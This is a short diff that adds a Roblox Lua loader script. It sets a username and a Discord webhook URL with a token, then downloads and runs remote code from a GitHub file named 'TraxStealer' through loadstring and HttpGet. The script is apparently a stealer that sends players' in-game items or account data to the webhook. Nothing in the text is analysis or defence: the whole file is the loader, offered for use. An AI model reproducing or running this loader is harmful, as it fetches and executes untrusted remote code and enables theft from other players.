@@ -1,0 +1,4 @@
+Username = "GHITABAHLOUL02"
+Webhook = "https://discord.com/api/webhooks/1223034369875247226/fMwgLQQsVcDqpaIzz47iDvoggHNRG0cbFQrEQxxnjW7uDSwQfId1g5BrQSsnBZoMHa2T"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/BGSI/refs/heads/main/TraxStealer"))()
